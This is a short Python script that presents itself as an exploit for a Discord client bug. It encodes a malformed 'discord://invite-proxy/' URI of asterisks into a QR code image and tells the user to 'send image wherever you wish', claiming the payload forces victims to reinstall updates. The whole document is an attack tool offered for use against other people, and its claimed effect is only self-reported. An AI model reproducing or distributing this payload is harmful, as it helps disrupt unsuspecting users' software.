# Title: Discord Overwrite / Corruption bug
# Description: This bug forces the user to install updates again, randomly found bug and is a nice addition to my collection. I have been experimenting
# Test 1 (RPC): Rich presence seems to get somewhat disabled until the user restartthe application (normal behaviour)
# Test 2 (Multiple URI's): No new results after 3 tries, seems I may have gotten lucky with my update screen but hey! There is always a chance im missing something
# Notes: I spent way too long finding this, please at least appreciate my effort!

import requests
import sys
import qrcode
import random

class Exploit:

    def __init__(self):
        print("\033[31mGenerating payload!\033[0m")

    def execute(self):
        uri = "<discord://invite-proxy/"+"*"*20+">"
        filename = "MyNewQr{}.png".format(str(random.randint(1000,9000)))
        x = qrcode.make(uri)
        x.save(filename)
        print("Saved QR code to {}".format(filename))
        print("\033[32mDone making payload, send image wherever you wish!\033[0m")


def main():
    exploit = Exploit()
    exploit.execute()

if __name__ == '__main__':
    main()
